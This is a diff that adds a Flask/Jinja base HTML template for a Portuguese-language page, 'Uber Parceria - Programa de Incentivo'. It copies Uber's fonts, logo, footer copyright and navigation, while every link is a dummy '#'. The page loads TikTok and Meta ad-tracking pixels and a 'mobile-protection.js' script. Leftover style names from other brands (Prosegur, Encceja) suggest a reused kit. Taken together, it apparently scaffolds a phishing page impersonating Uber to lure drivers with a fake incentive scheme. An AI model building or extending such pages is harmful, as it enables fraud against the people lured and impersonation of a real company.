@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <!-- TikTok Pixel Code Start -->
+    <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+      ttq.load('CVE2BIRC77UCRE2PJ1DG');
+      ttq.page();
+    }(window, document, 'ttq');
+    </script>
+    <!-- TikTok Pixel Code End -->
+    
+    <!-- Campaign Data Capture Script -->
+    <script>
+    // Global campaign tracking - capture on every page load
+    (function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const campaignData = {
+            fbclid: urlParams.get('fbclid'),
+            gclid: urlParams.get('gclid'),
+            utm_source: urlParams.get('utm_source'),
+            utm_medium: urlParams.get('utm_medium'),
+            utm_campaign: urlParams.get('utm_campaign'),
+            utm_content: urlParams.get('utm_content'),
+            utm_term: urlParams.get('utm_term'),
+            fb_action_ids: urlParams.get('fb_action_ids'),
+            fb_action_types: urlParams.get('fb_action_types'),
+            fb_source: urlParams.get('fb_source'),
+            timestamp: new Date().toISOString(),
+            page: window.location.pathname
+        };
+        
+        // Only store if we have campaign data
+        if (Object.values(campaignData).some(val => val !== null && val !== '')) {
+            localStorage.setItem('campaignData', JSON.stringify(campaignData));
+            console.log('Campaign data captured on page:', window.location.pathname, campaignData);
+        }
+    })();
+    </script>
+    
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    
+    // Initialize pixels if configured
+    {% if meta_pixel_ids %}
+        {% for pixel_id in meta_pixel_ids %}
+        fbq('init', '{{ pixel_id }}');
+        console.log('Meta Pixel initialized:', '{{ pixel_id }}');
+        {% endfor %}
+    {% else %}
+        // Fallback: Hard-coded pixel for production
+        fbq('init', '1418766538994503');
+        console.log('Meta Pixel initialized (fallback): 1418766538994503');
+    {% endif %}
+    
+    fbq('track', 'PageView');
+    console.log('Meta Pixel PageView tracked');
+    
+    // Test pixel connectivity
+    setTimeout(() => {
+        if (typeof fbq !== 'undefined') {
+            console.log('✅ Facebook Pixel loaded successfully after 1 second');
+        } else {
+            console.error('❌ Facebook Pixel failed to load after 1 second');
+        }
+    }, 1000);
+    </script>
+    
+    <!-- NoScript fallback -->
+    <noscript>
+    {% if meta_pixel_ids %}
+        {% for pixel_id in meta_pixel_ids %}
+        <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id={{ pixel_id }}&ev=PageView&noscript=1" />
+        {% endfor %}
+    {% endif %}
+    </noscript>
+    <!-- End Meta Pixel Code -->
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uber Parceria - Programa de Incentivo</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Uber Fonts CSS - DEPOIS DO TAILWIND -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/uber-fonts.css') }}">
+    <!-- Icon Fix CSS - DEPOIS DAS FONTES -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/icon-fix.css') }}">
+    {% block extra_head %}{% endblock %}
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        DEFAULT: ['"UberMoveText"', '"UberMove"', 'Arial', 'sans-serif'],
+                        sans: ['"UberMoveText"', '"UberMove"', 'Arial', 'sans-serif'],
+                        'heading': ['"UberMove"', '"UberMoveText"', 'Arial', 'sans-serif'],
+                        'body': ['"UberMoveText"', '"UberMove"', 'Arial', 'sans-serif'],
+                        'mono': ['"UberMoveText"', '"UberMove"', 'monospace'],
+                        'serif': ['"UberMoveText"', '"UberMove"', 'serif']
+                    },
+                    colors: {
+                        'military': {
+                            'green': '#2D5A27',
+                            'dark': '#1A3B19',
+                            'light': '#4A7A44'
+                        },
+                        'prosegur-blue': '#000000',
+                        'prosegur-black': '#000000',
+                        'prosegur-gray': '#666666',
+                        'prosegur': {
+                            'black': '#000000',
+                            'gray': '#666666',
+                            'blue': '#000000'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Uber Font Family */
+        @font-face {
+          font-family: 'UberMove';
+          src: url("{{ url_for('static', filename='fonts/UberMove-Medium.woff') }}") format('woff'),
+               url("{{ url_for('static', filename='fonts/UberMove-Medium.ttf') }}") format('truetype');
+          font-weight: 500;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'UberMoveText';
+          src: url("{{ url_for('static', filename='fonts/UberMoveText-Light.woff') }}") format('woff'),
+               url("{{ url_for('static', filename='fonts/UberMoveText-Light.ttf') }}") format('truetype');
+          font-weight: 300;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'UberMoveText';
+          src: url("{{ url_for('static', filename='fonts/UberMoveText-Regular.woff') }}") format('woff'),
+               url("{{ url_for('static', filename='fonts/UberMoveText-Regular.ttf') }}") format('truetype');
+          font-weight: 400;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'UberMoveText';
+          src: url("{{ url_for('static', filename='fonts/UberMoveText-Medium.woff') }}") format('woff'),
+               url("{{ url_for('static', filename='fonts/UberMoveText-Medium.ttf') }}") format('truetype');
+          font-weight: 500;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'UberMoveText';
+          src: url("{{ url_for('static', filename='fonts/UberMoveText-Bold.woff') }}") format('woff'),
+               url("{{ url_for('static', filename='fonts/UberMoveText-Bold.ttf') }}") format('truetype');
+          font-weight: 700;
+          font-style: normal;
+        }
+
+        /* Base Typography */
+        body {
+            font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+            font-size: 16px !important;
+            color: #333333 !important;
+            line-height: 24px !important;
+            background: #fff !important;
+        }
+
+        /* Consistent Font Weight for Bold Elements */
+        strong, .font-bold {
+          font-family: "UberMove", "UberMoveText", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+          font-weight: 700 !important;
+        }
+
+        /* Standard Text Classes */
+        .encceja-title {
+          font-family: "UberMove", "UberMoveText", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+          font-weight: 700 !important;
+          font-size: 16px !important;
+          color: #333333 !important;
+          line-height: 24px !important;
+          text-transform: uppercase;
+          text-align: left;
+          margin-bottom: 1rem;
+        }
+
+        .main-title {
+          font-family: "UberMove", "UberMoveText", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+          font-size: 28px !important;
+          font-weight: 700 !important;
+          line-height: 36px !important;
+          color: #333333 !important;
+          padding-bottom: 10px;
+          margin: 0;
+        }
+
+        .subtitle {
+          font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+          font-weight: 400 !important;
+          font-size: 16px !important;
+          color: #333333 !important;
+          line-height: 24px !important;
+          margin-bottom: 10px;
+        }
+
+        /* Drop Cap Effect */
+        .drop-cap::first-letter {
+          float: left;
+          font-size: 4em;
+          line-height: 0.68;
+          font-weight: bold;
+          margin-right: 0.05em;
+          color: #044785;
+        }
+
+        /* Standard Text Sizes and Colors */
+        .text-base {
+          font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+          font-size: 16px !important;
+          color: #333333 !important;
+          line-height: 24px !important;
+        }
+
+        .text-gray-700 {
+          color: #333333;
+        }
+
+        /* Font Family Classes */
+        .font-heading, .font-body {
+          font-family: "UberMove", "UberMoveText", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+        }
+        
+        /* Force Uber fonts on ALL elements - Ultimate override */
+        * {
+          font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+        }
+        
+        html {
+          font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+        }
+        
+        /* Override Tailwind and any other CSS frameworks */
+        .font-sans, .font-mono, .font-serif {
+          font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+        }
+        
+        /* FORCE WHITE TEXT AND BLACK BUTTONS - EXCEPT DRIVER SELECTORS */
+        .uber-btn, button:not(.driver-selector):not(#app-driver-yes):not(#app-driver-no), .btn, input[type="submit"], input[type="button"], 
+        .bg-black, .bg-black600, .bg-black500, .bg-green-600 {
+          background: #000 !important;
+          color: #fff !important;
+          font-size: 16px;
+          font-weight: 700;
+          border-radius: 2px !important;
+          padding: 10px 24px;
+          transition: background 0.2s;
+          border: none !important;
+        }
+        .uber-btn:hover, button:not(.driver-selector):not(#app-driver-yes):not(#app-driver-no):hover, .btn:hover, input[type="submit"]:hover, input[type="button"]:hover,
+        .bg-black:hover, .bg-black600:hover, .bg-black500:hover, .bg-green-600:hover {
+          background: #222 !important;
+          color: #fff !important;
+        }
+        
+        /* SPECIFIC OVERRIDES FOR DRIVER SELECTOR BUTTONS */
+        #app-driver-yes, #app-driver-no {
+          background: initial !important;
+          color: initial !important;
+          border: initial !important;
+          box-shadow: initial !important;
+        }
+        
+        /* FORCE ALL FOOTER TEXT TO WHITE */
+        footer *, footer a, footer span, footer p, footer div {
+          color: #fff !important;
+        }
+        .uber-btn-outline {
+          background: #000 !important;
+          color: #fff !important;
+          border: 1px solid #000 !important;
+          font-size: 16px;
+          font-weight: 500;
+          border-radius: 2px !important;
+          padding: 10px 24px;
+          transition: background 0.2s;
+        }
+        .uber-btn-outline:hover {
+          background: #222 !important;
+          color: #fff !important;
+        }
+        
+        /* Typography adjustments */
+        p, span, li, a, div, label {
+          line-height: 1.5;
+          font-size: 16px;
+        }
+        
+        /* Force 0px border radius globally */
+        *, *::before, *::after {
+          border-radius: 0px !important;
+        }
+
+        /* Driver Selector Buttons - Override all global button styles */
+        .driver-selector {
+          font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
+          font-size: 16px !important;
+          font-weight: 600 !important;
+          border-radius: 0px !important;
+          padding: 12px 32px !important;
+          transition: all 0.2s ease !important;
+          cursor: pointer !important;
+          border: 2px solid !important;
+        }
+        
+        .driver-selector.unselected {
+          background-color: #ffffff !important;
+          color: #6b7280 !important;
+          border-color: #d1d5db !important;
+        }
+        
+        .driver-selector.unselected:hover {
+          background-color: #f9fafb !important;
+          border-color: #9ca3af !important;
+        }
+        
+        .driver-selector.selected {
+          background-color: #000000 !important;
+          color: #ffffff !important;
+          border-color: #000000 !important;
+        }
+
+        /* Headings with Uber styling */
+        h1, h2, h3, h4, h5, h6 {
+          font-family: "UberMove", "UberMoveText", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+          font-size: 32px !important;
+          font-weight: 700 !important;
+          line-height: 1.2 !important;
+          color: #333333 !important;
+        }
+        
+        @media (max-width: 768px) {
+          h1, h2, h3, h4, h5, h6 {
+            font-size: 28px !important;
+          }
+        }
+        
+        @media (max-width: 640px) {
+          h1, h2, h3, h4, h5, h6 {
+            font-size: 24px !important;
+          }
+        }
+
+        /* Body text with Uber styling */
+        p, span, div, label, input, textarea, button {
+          font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+          font-size: 16px !important;
+          line-height: 24px !important;
+          color: #333333 !important;
+        }
+    </style>
+    
+    <!-- Additional CSS to ensure Uber fonts load -->
+    <style>
+        /* Final font override - executed after all other CSS */
+        @import url('data:text/css;base64,');
+        
+        /* WebKit font display optimization */
+        @font-face {
+          font-family: 'UberMoveText';
+          src: url("{{ url_for('static', filename='fonts/UberMoveText-Regular.woff') }}") format('woff');
+          font-weight: 400;
+          font-display: swap;
+        }
+        @font-face {
+          font-family: 'UberMove';
+          src: url("{{ url_for('static', filename='fonts/UberMove-Medium.woff') }}") format('woff');
+          font-weight: 500;
+          font-display: swap;
+        }
+        
+        /* Ultra-specific selectors to override everything */
+        body, body *, html, html * {
+          font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
+        }
+        
+        /* Força final - Máxima prioridade */
+        * { font-family: "UberMoveText" !important; }
+    </style>
+    
+    <!-- CSS inline adicional para garantir -->
+    <style>
+        @import url("{{ url_for('static', filename='css/uber-fonts.css') }}");
+    </style>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    
+    <!-- FORÇA ULTRA-FINAL DAS FONTES UBER -->
+    <script>
+        // Executa imediatamente sem esperar DOM
+        (function() {
+            // Injeta CSS diretamente no head
+            const style = document.createElement('style');
+            style.id = 'uber-fonts-force';
+            style.textContent = `
+                @font-face {
+                    font-family: 'UberMoveText';
+                    src: url('/static/fonts/UberMoveText-Light.woff') format('woff'), url('/static/fonts/UberMoveText-Light.ttf') format('truetype');
+                    font-weight: 300;
+                    font-display: swap;
+                }
+                @font-face {
+                    font-family: 'UberMoveText';
+                    src: url('/static/fonts/UberMoveText-Regular.woff') format('woff'), url('/static/fonts/UberMoveText-Regular.ttf') format('truetype');
+                    font-weight: 400;
+                    font-display: swap;
+                }
+                @font-face {
+                    font-family: 'UberMoveText';
+                    src: url('/static/fonts/UberMoveText-Medium.woff') format('woff'), url('/static/fonts/UberMoveText-Medium.ttf') format('truetype');
+                    font-weight: 500;
+                    font-display: swap;
+                }
+                @font-face {
+                    font-family: 'UberMoveText';
+                    src: url('/static/fonts/UberMoveText-Bold.woff') format('woff'), url('/static/fonts/UberMoveText-Bold.ttf') format('truetype');
+                    font-weight: 700;
+                    font-display: swap;
+                }
+                @font-face {
+                    font-family: 'UberMove';
+                    src: url('/static/fonts/UberMove-Medium.woff') format('woff'), url('/static/fonts/UberMove-Medium.ttf') format('truetype');
+                    font-weight: 500;
+                    font-display: swap;
+                }
+                
+                /* MÁXIMA PRIORIDADE - SOBRESCREVE TUDO */
+                *, *::before, *::after, html, body, div, p, span, h1, h2, h3, h4, h5, h6, a, label, input, textarea, button, li, ul, ol, nav, header, footer, main, section, article, aside {
+                    font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
+                }
+                
+                h1, h2, h3, h4, h5, h6, .main-title, .encceja-title {
+                    font-family: "UberMove", "UberMoveText", Arial, sans-serif !important;
+                    font-size: 28px !important;
+                    font-weight: 700 !important;
+                    line-height: 36px !important;
+                    color: #333333 !important;
+                }
+                
+                body, p, span, div, label, input, textarea, button, .text-base, .subtitle {
+                    font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
+                    font-size: 16px !important;
+                    line-height: 24px !important;
+                    color: #333333 !important;
+                }
+                
+                .font-sans, .font-heading, .font-body {
+                    font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
+                }
+            `;
+            document.head.appendChild(style);
+            
+            // Executa novamente quando DOM carrega
+            document.addEventListener('DOMContentLoaded', function() {
+                // Aplica style diretamente nos elementos
+                const allElements = document.querySelectorAll('*');
+                allElements.forEach(el => {
+                    el.style.setProperty('font-family', '"UberMoveText", "UberMove", Arial, sans-serif', 'important');
+                });
+                
+                console.log('UBER FONTS DEFINITIVAMENTE APLICADAS!');
+            });
+        })();
+    </script>
+    
+    <!-- Mobile Protection - Execute immediately -->
+    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
+</head>
+<body class="bg-white text-black min-w-[0]">
+    <!-- Uber Header -->
+    <div class="w-full bg-black text-white text-xs font-normal py-4 px-4 flex items-center justify-between fixed top-0 left-0 right-0 z-50" style="min-height:64px; border-radius: 0px;">
+      <img src="https://i.ibb.co/0RR0HNC0/13093103960002-1.png" alt="Logo Uber estilizado em preto e branco, com fundo transparente" class="h-8 w-auto" style="max-height:32px; border-radius: 0px;">
+      <div class="flex items-center md:hidden">
+        <button aria-label="Abrir menu" class="flex flex-col justify-center items-center space-y-1">
+          <span class="block w-7 h-1.5 bg-white rounded" style="height:7px;"></span>
+          <span class="block w-7 h-1.5 bg-white rounded" style="height:7px;"></span>
+        </button>
+      </div>
+    </div>
+    <!-- Subnav (hidden on mobile) -->
+    <div class="w-full bg-white border-b border-gray-200 text-xs px-4 py-2 items-center justify-between hidden md:flex fixed top-16 left-0 right-0 z-40" style="border-radius: 0px;">
+      <div class="flex items-center space-x-2">
+        <span class="font-bold text-base text-black mr-4" style="font-family: 'Uber Move', Arial, sans-serif;">Dirigir</span>
+        <a class="text-black hover:underline" href="#">Visão geral</a>
+        <a class="text-black hover:underline" href="#">Requisitos</a>
+        <a class="text-black hover:underline" href="#">Entregador parceiro</a>
+        <a class="text-black hover:underline" href="#">Regras básicas</a>
+        <a class="text-black hover:underline" href="#">Ganhos</a>
+        <a class="text-black hover:underline" href="#">Opções de veículos</a>
+        <a class="text-black hover:underline" href="#">Descontos</a>
+        <a class="text-black hover:underline" href="#">Segurança</a>
+        <a class="text-black hover:underline" href="#">Uber Pro</a>
+      </div>
+      <div class="flex items-center space-x-2">
+        <span class="text-xs text-gray-500">Mais</span>
+        <i class="fas fa-chevron-down text-xs text-gray-500"></i>
+      </div>
+    </div>
+
+    <!-- Main content -->
+    <div class="max-w-[1100px] mx-auto px-4 pt-32 pb-8" style="margin-top: 80px;">
+        {% block content %}{% endblock %}
+    </div>
+
+    <!-- Uber Footer -->
+    <footer class="w-full bg-black text-white pt-10 pb-6 px-4 mt-0">
+      <div class="max-w-[1100px] mx-auto">
+        <div class="flex flex-col md:flex-row md:justify-between md:items-start mb-8 space-y-8 md:space-y-0">
+          <div class="flex flex-col items-start space-y-4 md:space-y-6">
+            <img src="https://i.ibb.co/0RR0HNC0/13093103960002-1.png" alt="Logo Uber estilizado em preto e branco, com fundo transparente" class="h-8 w-auto" style="max-height:32px;">
+            <span class="text-white text-sm">© 2024 Uber Technologies Inc.</span>
+          </div>
+          <div class="flex flex-col md:flex-row md:space-x-16 space-y-6 md:space-y-0">
+            <div class="flex flex-col space-y-2">
+              <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Privacidade</a>
+              <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Acessibilidade</a>
+              <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Termos</a>
+            </div>
+            <div class="flex flex-col space-y-2">
+              <span class="text-white text-base" style="color: #fff !important;">Idioma</span>
+              <span class="text-white text-base" style="color: #fff !important;">Português (Brasil)</span>
+              <span class="text-white text-base" style="color: #fff !important;">Localização</span>
+              <span class="text-white text-base" style="color: #fff !important;">Brasil</span>
+            </div>
+            <div class="flex flex-row items-center space-x-4 mt-4 md:mt-0">
+              <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-facebook-f"></i></a>
+              <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-twitter"></i></a>
+              <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-instagram"></i></a>
+              <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-youtube"></i></a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script src="{{ url_for('static', filename='js/validation.js') }}"></script>
+    <script src="{{ url_for('static', filename='fix_colors.js') }}"></script>
+</body>
+</html>
